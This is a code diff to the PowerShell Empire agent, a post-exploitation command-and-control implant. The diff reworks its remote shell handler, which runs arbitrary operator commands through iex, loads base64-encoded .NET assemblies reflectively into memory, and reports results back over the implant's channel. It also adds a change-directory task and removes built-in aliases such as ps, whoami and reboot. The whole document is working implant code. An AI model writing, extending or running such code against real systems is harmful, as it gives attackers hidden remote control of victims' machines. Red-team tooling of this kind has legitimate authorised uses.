@@ -259,174 +259,50 @@ function Invoke-Empire {
 
     # handle shell commands and return any results
     function Invoke-ShellCommand {
-        param($cmd, $cmdargs="")
+        param($command)
+
+        if (-not $command) { return "`nno shell command supplied" }
 
         # UNC path normalization for PowerShell
-        if ($cmdargs -like "*`"\\*") {
-            $cmdargs = $cmdargs -replace "`"\\","FileSystem::`"\";
+        if ($command -like "*`"\\*") {
+            $command = $command -replace "`"\\","FileSystem::`"\";
         }
-        elseif ($cmdargs -like "*\\*") {
-            $cmdargs = $cmdargs -replace "\\\\","FileSystem::\\";
+        elseif ($command -like "*\\*") {
+            $command = $command -replace "\\\\","FileSystem::\\";
         }
 
-        $output = '';
-        if ($cmd.ToLower() -eq 'shell') {
-            # if we have a straight 'shell' command, skip the aliases
-            if ($cmdargs.length -eq '') { $output = 'no shell command supplied' }
-            else {
-                $OldConsoleOut = [Console]::Out;
-                $StringWriter = New-Object IO.StringWriter;
-                [Console]::SetOut($StringWriter);
-                $output = iex "$cmdargs" | out-string;
-                #for somereason this was quoted again and it shouldn't need to be
-                #$output = iex $cmdargs
-                [Console]::SetOut($OldConsoleOut);
+        if ($command.ToLower().StartsWith('reflectiveload ')) {
+            $b64 = $command.Substring('reflectiveload '.Length).Trim();
+            if (-not $b64) { return "`nno binary supplied" }
+            try {
+                $assembly = [System.Reflection.Assembly]::Load([Convert]::FromBase64String($b64));
+                return "`n`r Reflective Load Complete";
+            }
+            catch {
+                return "`n[!] Reflective load failed: $_";
+            }
+        }
 
-                if ($output.length -eq 0){
-                    $output = $StringWriter.ToString();
-                    }
-            }
-            $output += "`n`r";
+        $OldConsoleOut = [Console]::Out;
+        $StringWriter = New-Object IO.StringWriter;
+        [Console]::SetOut($StringWriter);
+        try {
+            # 2>&1 merges PowerShell's error stream into the success stream so non-terminating
+            # errors show up in the operator output instead of being silently dropped.
+            $output = iex "$command 2>&1" | out-string;
         }
-        elseif ($cmd.ToLower() -eq 'reflectiveload'){
-            if ($cmdargs.length -eq '') { $output = 'no binary supplied' };
-            else{
-                $assembly = [System.Reflection.Assembly]::Load([Convert]::FromBase64String($cmdargs));
-                $output = "`n`r Reflective Load Complete";
-            }
+        catch {
+            $output = "[!] $_";
         }
-        else {
-            switch -regex ($cmd) {
-                '(ls|^dir)' {
-                    if ($cmdargs.length -eq "") {
-                        $output = Get-ChildItem -force | select mode,@{Name="Owner";Expression={(Get-Acl $_.FullName).Owner }},@{Name="LastWriteTime";Expression={($_.LastWriteTime.ToString("u"))}},length,name | ConvertTo-Json;
-                    }
-                    else {
-                        try{
-                            $output = IEX "$cmd $cmdargs -Force -ErrorAction Stop" | select mode,@{Name="Owner";Expression={ (Get-Acl $_.FullName).Owner }},@{Name="LastWriteTime";Expression={($_.LastWriteTime.ToString("u"))}},length,name | ConvertTo-Json;
-                        }
-                        catch [System.Management.Automation.ActionPreferenceStopException] {
-                            $output = "[!] Error: $_ (or cannot be accessed).";
-                        }
-                    }
-                }
-                '(mv|move|copy|cp|rm|del|rmdir|mkdir)' {
-                    if ($cmdargs.length -ne "") {
-                        try {
-                            IEX "$cmd $cmdargs -Force -ErrorAction Stop";
-                            $output = "executed $cmd $cmdargs";
-                        }
-                        catch {
-                            $output=$_.Exception;
-                        }
-                    }
-                }
-                cd {
-                    if ($cmdargs.length -ne '')
-                    {
-                        $cmdargs = $cmdargs.trim("`"").trim("'");
-                        cd "$cmdargs";
-                        $output = pwd;
-                    }
-                }
-                '(ipconfig|ifconfig)' {
-                    $output = Get-WmiObject -class 'Win32_NetworkAdapterConfiguration' | ? {$_.IPEnabled -Match 'True'} | ForEach-Object {
-                        $out = New-Object psobject;
-                        $out | Add-Member Noteproperty 'Description' $_.Description;
-                        $out | Add-Member Noteproperty 'MACAddress' $_.MACAddress;
-                        $out | Add-Member Noteproperty 'DHCPEnabled' $_.DHCPEnabled;
-                        $out | Add-Member Noteproperty 'IPAddress' $($_.IPAddress -join ",");
-                        $out | Add-Member Noteproperty 'IPSubnet' $($_.IPSubnet -join ",");
-                        $out | Add-Member Noteproperty 'DefaultIPGateway' $($_.DefaultIPGateway -join ",");
-                        $out | Add-Member Noteproperty 'DNSServer' $($_.DNSServerSearchOrder -join ",");
-                        $out | Add-Member Noteproperty 'DNSHostName' $_.DNSHostName;
-                        $out | Add-Member Noteproperty 'DNSSuffix' $($_.DNSDomainSuffixSearchOrder -join ",");
-                        $out
-                    } | ConvertTo-Json;
-                }
-                # this is stupid how complicated it is to get this information...
-                '(ps|tasklist)' {
-                    $owners = @{};
-                    Get-WmiObject win32_process | ForEach-Object {
-                        try {
-                            $o = $_.getowner()
-                            if (-not $($o.User)) {
-                                $o = 'N/A'
-                            } else {
-                                $o = "$($o.Domain)\$($o.User)"
-                            }
-                        } catch {
-                            $o = 'N/A'
-                        }
-                        $owners[$_.handle] = $o
-                    }
-                    if($cmdargs -ne '') { $p = $cmdargs }
-                    else{ $p = "*" };
-                    $output = Get-Process $p | ForEach-Object {
-                        $arch = 'x64';
-                        if ([System.IntPtr]::Size -eq 4) {
-                            $arch = 'x86'
-                        }
-                        else{
-                            foreach($module in $_.modules) {
-                                if([System.IO.Path]::GetFileName($module.FileName).ToLower() -eq "wow64.dll") {
-                                    $arch = 'x86';
-                                    break
-                                }
-                            }
-                        }
-                        $out = New-Object psobject;
-                        $out | Add-Member Noteproperty 'ProcessName' $_.ProcessName;
-                        $out | Add-Member Noteproperty 'PID' $_.ID;
-                        $out | Add-Member Noteproperty 'Arch' $arch;
-                        $out | Add-Member Noteproperty 'UserName' $owners[$_.id.tostring()];
-                        $mem = "{0:N2} MB" -f $($_.WS/1MB);
-                        $out | Add-Member Noteproperty 'MemUsage' $mem;
-                        $out;
-                    } | Sort-Object -Property PID | ConvertTo-Json;
-                }
-                getpid { $output = [System.Diagnostics.Process]::GetCurrentProcess() }
-                route {
-                    if (($cmdargs.length -eq '') -or ($cmdargs.ToLower() -eq 'print')) {
-                        # build a table of adapter interfaces indexes -> IP address for the adapater
-                        $adapters = @{};
-                        Get-WmiObject Win32_NetworkAdapterConfiguration | ForEach-Object { $adapters[[int]($_.InterfaceIndex)] = $_.IPAddress };
-                        $output = Get-WmiObject win32_IP4RouteTable | ForEach-Object {
-                            $out = New-Object psobject;
-                            $out | Add-Member Noteproperty 'Destination' $_.Destination;
-                            $out | Add-Member Noteproperty 'Netmask' $_.Mask;
-                            if ($_.NextHop -eq "0.0.0.0") {
-                                $out | Add-Member Noteproperty 'NextHop' 'On-link';
-                            }
-                            else{
-                                $out | Add-Member Noteproperty 'NextHop' $_.NextHop;
-                            }
-                            if($adapters[$_.InterfaceIndex] -and ($adapters[$_.InterfaceIndex] -ne "")) {
-                                $out | Add-Member Noteproperty 'Interface' $($adapters[$_.InterfaceIndex] -join ",");
-                            }
-                            else {
-                                $out | Add-Member Noteproperty 'Interface' '127.0.0.1';
-                            }
-                            $out | Add-Member Noteproperty 'Metric' $_.Metric1;
-                            $out;
-                        } | ConvertTo-Json;
-                    }
-                    else { $output = route $cmdargs };
-                }
-                '(whoami|getuid)' { $output = [Security.Principal.WindowsIdentity]::GetCurrent().Name };
-                hostname {
-                    $output = [System.Net.Dns]::GetHostByName(($env:computerName));
-                }
-                '(reboot|restart)' { Restart-Computer -force };
-                shutdown { Stop-Computer -force };
-                default {
-                    if ($cmdargs.length -eq '') { $output = IEX $cmd | Out-String }
-                    else { $output = IEX "$cmd $cmdargs" | Out-String };
-                }
-            }
+        finally {
+            [Console]::SetOut($OldConsoleOut);
         }
-        "`n"+($output);
+        if ($output.length -eq 0) {
+            $output = $StringWriter.ToString();
+        }
+        "`n" + $output;
     }
+
 
     # takes a string representing a PowerShell script to run, build a new
     #   AppDomain and PowerShell runspace, and kick off the execution in the
@@ -755,18 +631,11 @@ function Invoke-Empire {
 
             # shell command
             elseif($type -eq 40) {
-                $parts = $data.Split(" ");
-                # if the command has no arguments
-                if($parts.Length -eq 1) {
-                    $cmd = $parts[0];
-                    Encode-Packet -type $type -data $((Invoke-ShellCommand -cmd $cmd) -join "`n").trim() -ResultID $ResultID;
+                $command = $data;
+                if ($command.ToLower().StartsWith('shell ')) {
+                    $command = $command.Substring(6);
                 }
-                # if the command has arguments
-                else{
-                    $cmd = $parts[0];
-                    $cmdargs = $parts[1..$parts.length] -join " ";
-                    Encode-Packet -type $type -data $((Invoke-ShellCommand -cmd $cmd -cmdargs $cmdargs) -join "`n").trim() -ResultID $ResultID;
-                }
+                Encode-Packet -type $type -data $((Invoke-ShellCommand -command $command) -join "`n").trim() -ResultID $ResultID;
                 $script:tasks[$ResultID]['status'] = 'completed'
             }
             # file download
@@ -913,6 +782,29 @@ function Invoke-Empire {
                 }
                 Encode-Packet -data $output -type $type -ResultID $ResultID;
                 $script:tasks[$ResultID]['status'] = 'completed'
+            }
+
+            # change directory
+            elseif($type -eq 44) {
+                $output = '';
+                $success = $true;
+                try {
+                    $path = $data.Trim('"').Trim("'");
+                    if (-not $path) { throw 'no path supplied' }
+                    Set-Location -LiteralPath $path -ErrorAction Stop;
+                    $output = Get-Location | Select-Object -ExpandProperty Path;
+                }
+                catch {
+                    $output = "[!] chdir failed: $_";
+                    $success = $false;
+                }
+                if ($success) {
+                    Encode-Packet -type 44 -data $output -ResultID $ResultID;
+                    $script:tasks[$ResultID]['status'] = 'completed'
+                } else {
+                    Encode-Packet -type 0 -data $output -ResultID $ResultID;
+                    $script:tasks[$ResultID]['status'] = 'error'
+                }
             }
 
             elseif($type -eq 120){
